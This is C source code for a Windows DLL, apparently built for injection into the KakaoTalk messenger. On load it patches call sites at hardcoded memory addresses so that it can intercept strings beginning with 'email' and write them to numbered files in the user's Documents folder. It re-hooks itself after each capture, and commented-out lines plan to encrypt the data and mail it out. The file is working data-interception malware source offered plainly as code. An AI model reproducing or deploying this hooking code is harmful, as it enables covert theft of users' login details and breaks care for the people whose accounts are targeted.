#include "windows.h"
#include "stdio.h"
#include "stdlib.h"
#include "tchar.h"
#include "Shlobj.h"

HMODULE g_hMod = NULL;
BYTE g_org1[5] = { 0, }, g_org2[5] = { 0, };
FARPROC g_pfnOrg1, g_pfnOrg2;
char path[MAX_PATH] = { 0, };

char count[] = "0.txt";

typedef int (WINAPI *pfnOrg)(int arg1, int arg2);

void hook();
void unhook();

void rehook();
void unhook2();

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	BYTE arr[5];
	BYTE* ptr = (BYTE*)(0x400000 + 0x33A364);

	if (path[0] == '\0') {
		for (int i = 0; i < sizeof(arr); i++) {
			arr[i++] = *ptr++;
		}

		SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path);
	}
	else {
		Sleep(3000);
	}

	hook();

	return 0;
}

void newFunc(char* arg1, LPVOID arg2)
{
	HANDLE hThread;
	CONTEXT ctx;

	int* ret;
	char* str;
	char tmp[MAX_PATH];

	__asm pushad;   // pushad

	OutputDebugString(L"Hello kakao");

	hThread = GetCurrentThread();
	ctx.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(hThread, &ctx);

	strcpy(tmp, path);

	str = arg1;
	if(!strncmp(str, "email", 5)) {
		FILE * fp = fopen(strcat(strcat(tmp, "\\Documents\\test"), count), "at");

		count[0]++;
		if (count[0] > '9') {
			count[0] = '0';
		}

		if (fp != NULL) {
			fprintf(fp, "%s\n", str);
			fclose(fp);
		}
		// 1. 추가 할 기능() 데이터 암호화
		// system("sendMail");

		OutputDebugString(L"Bye kakao");
	}

	unhook();
	// CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);

	ret = (int *) (*((int *)ctx.Ebp + 2) + 0x4);   // ebp + 0x4
	*ret = *ret - 5;

	__asm popad;   // popad
}

void hook()
{
	DWORD old, addr, pfn;
	BYTE* ptr = (BYTE*)(0x400000 + 0x33A364), *temp;

	OutputDebugString(L"Hook function start");

	if (g_org1[0]) {   // already hooked!
		return;
	}

	pfn = *((DWORD*)(ptr + 1)) + 5 + (0x400000 + 0x33A364);
	g_pfnOrg1 = (FARPROC)pfn;

	for (int i = 0; i < 5; i++) {
		g_org1[i] = *ptr++;
	}
	ptr = (BYTE*)(0x400000 + 0x33A364 + 1);

	VirtualProtect(ptr, 5, PAGE_EXECUTE_READWRITE, &old);

	addr = (DWORD)newFunc - (0x400000 + 0x33A364) - 5;
	temp = (BYTE*)&addr;

	for (int i = 0; i < 4; i++) {
		*ptr++ = *temp++;
	}

	VirtualProtect(ptr, 5, old, NULL);
	// =========================================================

	ptr = (BYTE*)0x71DCDC;

	pfn = *((DWORD*)(ptr + 1)) + 5 + (0x71DCDC);
	g_pfnOrg2 = (FARPROC)pfn;

	for (int i = 0; i < 5; i++) {
		g_org2[i] = *ptr++;
	}
	ptr = (BYTE*)(0x71DCDC + 1);

	VirtualProtect(ptr, 4, PAGE_EXECUTE_READWRITE, &old);

	addr = (DWORD)rehook - (0x71DCDC) - 5;
	temp = (BYTE*)&addr;

	for (int i = 0; i < 4; i++) {
		*ptr++ = *temp++;
	}

	VirtualProtect(ptr, 4, old, NULL);

	OutputDebugString(L"Hook function end");
}

void rehook()
{
	DWORD old, addr, pfn, *ret;
	BYTE* ptr, *temp;
	HANDLE hThread;
	CONTEXT ctx;

	__asm pushad;   // pushad

	ptr = (BYTE*)(0x400000 + 0x33A364);
	OutputDebugString(L"reook start");

	pfn = *((DWORD*)(ptr + 1)) + 5 + (0x400000 + 0x33A364);
	g_pfnOrg1 = (FARPROC)pfn;

	for (int i = 0; i < 5; i++) {
		g_org1[i] = *ptr++;
	}
	ptr = (BYTE*)(0x400000 + 0x33A364 + 1);

	VirtualProtect(ptr, 5, PAGE_EXECUTE_READWRITE, &old);

	addr = (DWORD)newFunc - (0x400000 + 0x33A364) - 5;
	temp = (BYTE*)&addr;

	for (int i = 0; i < 4; i++) {
		*ptr++ = *temp++;
	}

	VirtualProtect(ptr, 5, old, NULL);
	
	hThread = GetCurrentThread();
	ctx.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(hThread, &ctx);

	unhook2();

	ret = (DWORD *)(*((int *)ctx.Ebp + 2) + 0x4);   // ebp + 0x4
	*ret = *ret - 5;

	__asm popad;   // popad
}

void unhook()
{
	DWORD old, addr, pfn;
	BYTE* ptr = (BYTE*)(0x400000 + 0x33A364), *temp;

	VirtualProtect(ptr, 5, PAGE_EXECUTE_READWRITE, &old);

	for (int i = 0; i < 5; i++) {
		*ptr++ = g_org1[i];
	}

	VirtualProtect(ptr, 5, old, NULL);
	//=======================================================
	ptr = (BYTE*)(0x71DCDC + 1);

	VirtualProtect(ptr, 4, PAGE_EXECUTE_READWRITE, &old);

	addr = (DWORD)rehook - (0x71DCDC) - 5;
	temp = (BYTE*)&addr;

	for (int i = 0; i < 4; i++) {
		*ptr++ = *temp++;
	}

	VirtualProtect(ptr, 4, old, NULL);
}

void unhook2()
{
	DWORD old;
	BYTE* ptr = (BYTE*)(0x71DCDC);

	VirtualProtect(ptr, 5, PAGE_EXECUTE_READWRITE, &old);

	for (int i = 0; i < 5; i++) {
		*ptr++ = g_org2[i];
	}

	VirtualProtect(ptr, 5, old, NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	HANDLE hThread = NULL;

	g_hMod = (HMODULE)hinstDLL;

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		OutputDebugString(L"<hook.dll> Injection!!!");
		hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
		CloseHandle(hThread);
		break;
	}

	return TRUE;
}
